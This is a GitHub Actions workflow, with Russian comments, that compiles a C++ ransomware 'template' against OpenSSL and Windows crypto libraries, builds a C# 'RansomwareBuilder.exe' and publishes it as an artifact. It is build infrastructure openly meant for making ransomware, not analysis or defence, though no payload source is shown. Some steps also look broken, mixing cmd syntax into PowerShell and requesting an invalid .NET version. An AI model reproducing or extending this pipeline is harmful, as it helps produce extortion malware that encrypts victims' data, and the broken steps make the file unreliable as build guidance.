name: Build Ransomware Builder v6.0 (Full Power)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

env:
  VCPKG_ROOT: C:\vcpkg
  OPENSSL_ROOT_DIR: C:\Program Files\OpenSSL

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== КЭШ VCPKG ==========
    - name: Cache vcpkg
      uses: actions/cache@v3
      id: cache-vcpkg
      with:
        path: |
          C:\vcpkg
          C:\vcpkg\installed
          C:\Users\runneradmin\AppData\Local\vcpkg\archives
        key: vcpkg-${{ runner.os }}-${{ hashFiles('**/vcpkg.json') }}
        restore-keys: |
          vcpkg-${{ runner.os }}-
    
    # ========== УСТАНОВКА OPENSSL ЧЕРЕЗ VCPKG (с кэшем) ==========
    - name: Install OpenSSL via vcpkg
      if: steps.cache-vcpkg.outputs.cache-hit != 'true'
      run: |
        vcpkg install openssl:x64-windows-static
        echo "VCPKG_ROOT=C:\vcpkg" >> $env:GITHUB_ENV
    
    # ========== КЭШ CHOCOLATEY OPENSSL ==========
    - name: Cache Chocolatey OpenSSL
      uses: actions/cache@v3
      id: cache-choco-openssl
      with:
        path: C:\Program Files\OpenSSL
        key: openssl-choco-${{ runner.os }}-v1
        restore-keys: |
          openssl-choco-${{ runner.os }}-
    
    # ========== УСТАНОВКА OPENSSL ЧЕРЕЗ CHOCOLATEY (если нет в кэше) ==========
    - name: Install OpenSSL via Chocolatey
      if: steps.cache-choco-openssl.outputs.cache-hit != 'true'
      run: |
        choco install openssl -y --force
        echo "OPENSSL_ROOT_DIR=C:\Program Files\OpenSSL" >> $env:GITHUB_ENV
    
    # ========== ПОИСК БИБЛИОТЕК (отладка) ==========
    - name: Find OpenSSL libs
      run: |
        echo "=== Looking for OpenSSL libs ==="
        if exist "C:\Program Files\OpenSSL\lib" dir "C:\Program Files\OpenSSL\lib" /s
        if exist "C:\Program Files\OpenSSL\lib\VC" dir "C:\Program Files\OpenSSL\lib\VC" /s
        if exist "C:\vcpkg\installed\x64-windows-static\lib" dir "C:\vcpkg\installed\x64-windows-static\lib"
        echo "=== Looking for include ==="
        if exist "C:\Program Files\OpenSSL\include" dir "C:\Program Files\OpenSSL\include"
        if exist "C:\vcpkg\installed\x64-windows-static\include" dir "C:\vcpkg\installed\x64-windows-static\include"
    
    # ========== СБОРКА ШАБЛОНА (C++ C++17 + OpenSSL) ==========
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
    
    - name: Build Template
      run: |
        echo "=== Trying to compile template.cpp ==="
        
        # Пробуем Chocolatey OpenSSL
        if exist "C:\Program Files\OpenSSL\include\openssl\evp.h" (
          echo "Found OpenSSL in C:\Program Files\OpenSSL"
          
          if exist "C:\Program Files\OpenSSL\lib\libssl.lib" (
            echo "Using libssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\libssl.lib" "C:\Program Files\OpenSSL\lib\libcrypto.lib"
          ) elseif exist "C:\Program Files\OpenSSL\lib\ssl.lib" (
            echo "Using ssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\ssl.lib" "C:\Program Files\OpenSSL\lib\crypto.lib"
          ) elseif exist "C:\Program Files\OpenSSL\lib\VC\x64\MD\libssl.lib" (
            echo "Using VC libssl.lib (Chocolatey)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\Program Files\OpenSSL\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\Program Files\OpenSSL\lib\VC\x64\MD\libssl.lib" "C:\Program Files\OpenSSL\lib\VC\x64\MD\libcrypto.lib"
          ) else (
            echo "OpenSSL libs not found in Chocolatey path!"
            dir "C:\Program Files\OpenSSL" /s
            exit /b 1
          )
        ) elseif exist "C:\vcpkg\installed\x64-windows-static\include\openssl\evp.h" (
          echo "Found OpenSSL in vcpkg"
          if exist "C:\vcpkg\installed\x64-windows-static\lib\ssl.lib" (
            echo "Using ssl.lib (vcpkg)"
            cl /O2 /MT /EHsc /std:c++17 /I"C:\vcpkg\installed\x64-windows-static\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib "C:\vcpkg\installed\x64-windows-static\lib\ssl.lib" "C:\vcpkg\installed\x64-windows-static\lib\crypto.lib"
          ) else (
            echo "OpenSSL libs not found in vcpkg path!"
            dir "C:\vcpkg\installed\x64-windows-static\lib"
            exit /b 1
          )
        ) else (
          echo "OpenSSL not found!"
          exit /b 1
        )
        
        if exist template.exe (
          echo "=== Build SUCCESS ==="
          dir template.exe
        ) else (
          echo "=== Build FAILED ==="
          exit /b 1
        )
    
    # ========== СБОРКА БИЛДЕРА (C#) ==========
    - name: Setup .NET
      uses: actions/setup-dotnet@v4
      with:
        dotnet-version: '4.8.x'
    
    - name: Build Builder
      run: |
        dotnet build builder.csproj --configuration Release
        dir bin/Release/net48/RansomwareBuilder.exe
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v6_Full
        path: bin/Release/net48/RansomwareBuilder.exe
